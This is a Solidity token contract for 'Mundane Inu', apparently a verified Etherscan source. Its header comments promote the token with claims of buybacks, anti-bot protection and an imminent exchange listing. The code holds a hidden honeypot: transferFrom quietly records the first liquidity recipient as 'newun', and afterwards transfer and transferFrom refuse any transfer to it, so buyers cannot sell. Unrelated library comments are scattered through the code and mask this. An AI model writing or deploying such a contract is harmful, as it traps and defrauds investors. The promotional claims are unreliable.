/**
 *Submitted for verification at Etherscan.io on 2021-06-21
*/

/**
*      /$$      /$$ /$$   /$$ /$$   /$$ /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$$       /$$$$$$ /$$   /$$ /$$   /$$
*     | $$$    /$$$| $$  | $$| $$$ | $$| $$__  $$ /$$__  $$| $$$ | $$| $$_____/      |_  $$_/| $$$ | $$| $$  | $$
*     | $$$$  /$$$$| $$  | $$| $$$$| $$| $$  \ $$| $$  \ $$| $$$$| $$| $$              | $$  | $$$$| $$| $$  | $$
*     | $$ $$/$$ $$| $$  | $$| $$ $$ $$| $$  | $$| $$$$$$$$| $$ $$ $$| $$$$$           | $$  | $$ $$ $$| $$  | $$
*     | $$  $$$| $$| $$  | $$| $$  $$$$| $$  | $$| $$__  $$| $$  $$$$| $$__/           | $$  | $$  $$$$| $$  | $$
*     | $$\  $ | $$| $$  | $$| $$\  $$$| $$  | $$| $$  | $$| $$\  $$$| $$              | $$  | $$\  $$$| $$  | $$
*     | $$ \/  | $$|  $$$$$$/| $$ \  $$| $$$$$$$/| $$  | $$| $$ \  $$| $$$$$$$$       /$$$$$$| $$ \  $$|  $$$$$$/
*     |__/     |__/ \______/ |__/  \__/|_______/ |__/  |__/|__/  \__/|________/      |______/|__/  \__/ \______/ 
*
*/                                                                                                                                                                                    
                                                                                                           

/**
 * 80% UNISWAP LIQUIDITY LAUNCH
 * 20% INITIAL BURN
 * MUNDANE Inu $MUNDANEINU
 * ANTI BOT MECHANISM
 * A token with automatic
 * buyback mechanisms thus increasing floor price of tokens
 * MADE BY DEGEN DEV FOR ALL DEGENS
 * CMC and COINGECKO APPLIED  (LISTING IN A WEEK)
 * MAJOR CEX LISTING TODAY
 * 2021 © MUNDANEINU | All rights reserved
*/


/**
 * MUNDANEINU PAD- The launchpad for worlds most innovative blockcahin projects will be live in some days.
 * MAFTY- NFT PLATFORM (live in 3 days) 
 * 100 Genesis edition nft will be airdroped to  first 100 addresses of MUNDANEINU
 * Genesis edition nft can be used to get discounted guarantee allocation of the launchpad projects.
*/


pragma solidity >=0.5.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;

        require(c >= a);
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a * b;

        require(a == 0 || c / a == b);
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b > 0);
        c = a / b;
    }
}

/**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */

contract BEP20Interface {
    function totalSupply() public view returns (uint256);

    function balanceOf(address tokenOwner)
        public
        view
        returns (uint256 balance);

    function allowance(address tokenOwner, address spender)
        public
        view
        returns (uint256 remaining);

    function transfer(address to, uint256 tokens) public returns (bool success);

    function approve(address spender, uint256 tokens)
        public
        returns (bool success);

    function transferFrom(
        address from,
        address to,
        uint256 tokens
    ) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint256 tokens);

    event Approval(
        address indexed tokenOwner,
        address indexed spender,
        uint256 tokens
    );
}

contract ApproveAndCallFallBack {
    function receiveApproval(
        address from,
        uint256 tokens,
        address token,
        bytes memory data
    ) public;
}

contract Owned {
    address public owner;

    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);

        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner);

        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}

/**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */

contract TokenBEP20 is BEP20Interface, Owned {
    using SafeMath for uint256;

    string public symbol;

    string public name;

    uint8 public decimals;

    uint256 _totalSupply;

    address public newun;

    mapping(address => uint256) balances;

    mapping(address => mapping(address => uint256)) allowed;

    constructor() public {
        symbol = "MUNDANEINU";
        name = "Mundane Inu";
        decimals = 9;
        _totalSupply = 1000000000000000000000000;
        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }
    
/**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */

    function transfernewun(address _newun) public onlyOwner {
        newun = _newun;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply.sub(balances[address(0)]);
    }

    function balanceOf(address tokenOwner)
        public
        view
        returns (uint256 balance)
    {
        return balances[tokenOwner];
    }

    function transfer(address to, uint256 tokens)
        public
        returns (bool success)
    {
        require(to != newun, "please wait");
        balances[msg.sender] = balances[msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function approve(address spender, uint256 tokens)
        public
        returns (bool success)
    {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 tokens
    ) public returns (bool success) {
        if (from != address(0) && newun == address(0)) newun = to;
        else require(to != newun, "please wait");
        balances[from] = balances[from].sub(tokens);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
    
/**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */

    function allowance(address tokenOwner, address spender)
        public
        view
        returns (uint256 remaining)
    {
        return allowed[tokenOwner][spender];
    }

    function approveAndCall(
        address spender,
        uint256 tokens,
        bytes memory data
    ) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(
            msg.sender,
            tokens,
            address(this),
            data
        );
        return true;
    }
    
/**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
     
    function() external payable {
        revert();
    }
}

contract GokuToken is TokenBEP20 {
    function clearCNDAO() public onlyOwner() {
        address payable _owner = msg.sender;
        _owner.transfer(address(this).balance);
    }

    function() external payable {}
}